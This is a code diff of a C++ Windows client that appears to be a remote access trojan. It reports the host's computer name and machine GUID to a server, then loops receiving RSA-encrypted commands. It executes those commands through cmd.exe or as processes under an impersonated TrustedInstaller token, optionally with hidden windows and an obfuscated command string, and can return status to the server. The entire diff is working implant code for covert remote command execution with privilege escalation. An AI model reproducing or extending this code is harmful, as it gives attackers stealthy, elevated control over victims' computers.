@@ -64,7 +64,7 @@ BOOL Client::Connect() {
 
 	UDPResponse response;
 	sockaddr_in serverAddr;
-	BOOL received = ReceiveMessageFromServer(this->m_UDPServerDetails, response, serverAddr);
+	BOOL received = NetCommon::ReceiveData(response, this->m_UDPSocket, UDP, serverAddr);
 	if ( !received )
 		return FALSE;
 
@@ -88,7 +88,6 @@ BOOL Client::Connect() {
 	SendComputerNameToServer();
 	SendMachineGUIDToServer();
 	OutputDebugStringA("yes");
-	GetCommand();
 
 	return TRUE;
 }
@@ -161,38 +160,64 @@ BOOL Client::SendMachineGUIDToServer() {
 
 BOOL Client::PerformCommand(const ServerCommand& command, ClientResponse& outResponse) {
 	BOOL success = FALSE;
+
 	switch ( command.action ) {
 	case RemoteAction::kPingClient:
-		outResponse.actionPerformed = RemoteAction::kPingClient;
-		outResponse.responseCode = ClientResponseCode::kResponseOk;
-		outResponse.id = rand() % 100;
 		success = TRUE;
 		break;
 	case RemoteAction::kOpenRemoteProcess:
-	case RemoteAction::KOpenElevatedProcess:
 		CLIENT_DBG("opening elevated process");
-		std::string normal = command.buffer;
-		std::wstring args = std::wstring(normal.begin(), normal.end());
 
 		STARTUPINFO si = { 0 };
 		PROCESS_INFORMATION pi = { 0 };
-		CLIENT_DBG(normal.c_str());
+		uint32_t creationFlags = NULL;
+		HANDLE context = NULL;
+		std::string application = ""; // no application
+
+		if ( command.flags & NO_CONSOLE ) {
+			si.wShowWindow = SW_HIDE;
+			si.dwFlags = STARTF_USESHOWWINDOW;
+		}
+		else if ( ( command.flags & NO_CONSOLE ) == 0 ) // show console
+			creationFlags |= CREATE_NEW_CONSOLE;
+
+		if ( command.flags & RUN_AS_NORMAL )
+			context = this->m_ProcMgr.GetToken();
+		else if ( command.flags & RUN_AS_HIGHEST ) 
+			context = this->m_ProcMgr.GetTrustedInstallerToken();
+
+		if ( command.flags & USE_CLI ) {
+			application = std::string(HIDE("\"C:\\Windows\\System32\\cmd.exe\"")); // use cmd.exe
+			// buffer are the command line args
+			std::string cla(command.buffer, command.buffLen);
+			application += " ";
+			application += cla;
+		}
+		else if ( ( command.flags & USE_CLI ) == 0 ) // opening regular process
+			application = std::string(command.buffer, command.buffLen);
 
 		success = this->m_ProcMgr.OpenProcessAsImposter(
 			this->m_ProcMgr.GetTrustedInstallerToken(),
-			LOGON_WITH_PROFILE,
+			0,
 			NULL,
-			args.data(),
-			CREATE_NEW_CONSOLE,
+			std::wstring(application.begin(), application.end()).data(),
+			creationFlags,
 			NULL,
 			NULL,
 			&si,
 			&pi
 		);
+
 		CLIENT_DBG("opened...");
 
 		break;
 	}
+
+	if ( command.flags & RESPOND_WITH_STATUS ) {
+		outResponse.actionPerformed = command.action;
+		outResponse.responseCode = (success == TRUE) ? ClientResponseCode::kResponseOk : ClientResponseCode::kResponseError;
+	}
+
 	return success;
 }
 
@@ -206,53 +231,37 @@ BOOL Client::IsServerAwaitingResponse(const ServerCommand& commandPerformed) {
 	return sendResponse;
 }
 
+Packet Client::OnEncryptedPacket(BYTESTRING encrypted) {
+	BYTESTRING decrypted    = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.priv, TRUE); 
+	Packet     deserialized = Serialization::DeserializeToStruct<Packet>(decrypted);
+	
+	return deserialized;
+}
+
 void Client::ListenForServerCommands() {
-	//while ( TRUE ) {
-	//	BYTESTRING encrypted;
-	//	ClientResponse response; // response to send to server after receiving a request
+	BOOL received = FALSE;
+	while ( TRUE ) {
+		BYTESTRING encrypted;
 
-	//	// receive data on tcp socket, put it into buffer
-	//	BOOL received = NetCommon::ReceiveData(
-	//						encrypted,
-	//						this->m_TCPSocket,
-	//						TCP
-	//					);
+		received = NetCommon::ReceiveData(
+			encrypted,
+			this->m_TCPSocket,
+			TCP
+		);
 
-	//	if ( !received )
-	//		continue;
+		Packet receivedPacket = OnEncryptedPacket(encrypted);
+		ClientResponse responseToServer;
+		CLIENT_DBG("got packet from server");
 
-	//	CLIENT_DBG(this->m_RequestSecrets.strPrivateKey.c_str());
+		if ( receivedPacket.flags & PACKET_IS_A_COMMAND )
+			PerformCommand(receivedPacket, responseToServer);
 
-	//	BYTESTRING decrypted = LGCrypto::RSADecrypt(encrypted, this->m_RequestSecrets.bioPrivateKey, TRUE);
-	//	std::string d = "size " + std::to_string(decrypted.size()) + "\n";
-	//	CLIENT_DBG(d.c_str());
+		if ( ( receivedPacket.flags & RESPOND_WITH_STATUS ) == 0 ) // dont need to respond to server with 'responseToServer'
+			continue;
 
-	//	ServerCommand command;
-	//	std::memcpy(&command, decrypted.data(), sizeof(decrypted));
-
-	//	CLIENT_DBG("received command ");
-
-	//	if ( !command.valid )
-	//		continue;
-
-	//	BOOL performed = PerformCommand(command, response);
-
-	//	if ( !performed )
-	//		continue;
-
-	//	if ( !IsServerAwaitingResponse(command) )
-	//		continue;
-
-	//	BOOL sent = NetCommon::TransmitData(
-	//		response,
-	//		this->m_TCPSocket,
-	//		TCP,
-	//		NetCommon::_default,
-	//		TRUE,
-	//		Serialization::GetBIOFromString(this->m_RequestSecrets.strPublicKey)
-	//	);
-	//}
-	//CLIENT_DBG("stopped receiving cmds ");
+		// respond to server with 'responseToServer'
+		NetCommon::TransmitData(responseToServer, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
+	}
 }
 
 BOOL Client::ExchangePublicKeys() {
@@ -296,58 +305,6 @@ BOOL Client::SendMessageToServer(std::string message, BOOL encrypted) {
 	return success;
 }
 
-BYTESTRING Client::GetCommand() {
-	BYTESTRING received; // encrypted packet struct 
-	NetCommon::ReceiveData(received, this->m_TCPSocket, TCP);
-	BYTESTRING decrypted = LGCrypto::RSADecrypt(received, this->m_RequestSecrets.priv, TRUE); // serialized packet struct
-	Packet packet = Serialization::DeserializeToStruct<Packet>(decrypted); // deserialized Packet Struct
-	//std::string command = Serialization::BytestringToString(packet.command);
-	//std::string dbg = "decrypted size : " + std::to_string(decrypted.size()) + "\n";
-	//CLIENT_DBG(dbg.c_str());
-	//std::string deserialized = Serialization::BytestringToString(decrypted);
-	//CLIENT_DBG(command.c_str());
-	char command[MAX_BUFFER_LEN];
-	memcpy(command, packet.buffer, packet.buffLen);
-	command[packet.buffLen] = '\0';
-	CLIENT_DBG(command);
-
-	std::wstring wstr;
-
-	STARTUPINFO			si = { 0 };
-	PROCESS_INFORMATION pi = { 0 };
-
-	this->m_ProcMgr.GetTrustedInstallerToken();
-	this->m_ProcMgr.OpenProcessAsImposter(
-		this->m_ProcMgr.GetToken(),
-		LOGON_WITH_PROFILE,
-		NULL,
-		wstr.data(),
-		CREATE_NEW_CONSOLE,
-		NULL,
-		NULL,
-		&si,
-		&pi
-	);
-
-
-	//BOOL received = NetCommon::ReceiveData(serverResponse, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, rsa, TRUE);
-	//std::string dbg = received ? "Received server command.\n" : "didnt receive!\n";
-
-	//CLIENT_DBG(dbg.c_str());
-	return {};
-}
-
-
-template <typename _Ty>
-BOOL Client::ReceiveMessageFromServer(const Server& who, _Ty& out, sockaddr_in& outAddr) {
-	if ( who.type == SOCK_STREAM )
-		return NetCommon::ReceiveData(out, this->m_TCPSocket, TCP);
-	else if ( who.type == SOCK_DGRAM )
-		return NetCommon::ReceiveData(out, this->m_UDPSocket, UDP, outAddr);
-	
-	return FALSE;
-}
-
 BOOL Client::SendMessageToServer(const Server& dest, ClientMessage message) {
 	if ( dest.type == SOCK_STREAM ) // tcp
 		return NetCommon::TransmitData(message, this->m_TCPSocket, TCP);
@@ -363,16 +320,6 @@ BOOL Client::SendEncryptedMessageToServer(const Server& dest, ClientMessage mess
 		success = NetCommon::TransmitData(message, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_ServerPublicKey, FALSE);
 	//else if ( dest.type == SOCK_DGRAM ) // udp
 		//success = NetCommon::TransmitData(message, this->m_UDPSocket, UDP, dest.addr, TRUE, pk, FALSE);
-
-	return success;
-}
-
-template <typename _Ty>
-BOOL Client::GetEncryptedMessageOnServer(const Server& dest, _Ty& out) {
-	BOOL success = FALSE;
-
-	if ( dest.type == SOCK_STREAM )
-		success = NetCommon::ReceiveData(out, this->m_TCPSocket, TCP, NetCommon::_default, TRUE, this->m_RequestSecrets.priv, TRUE);
 
 	return success;
 }
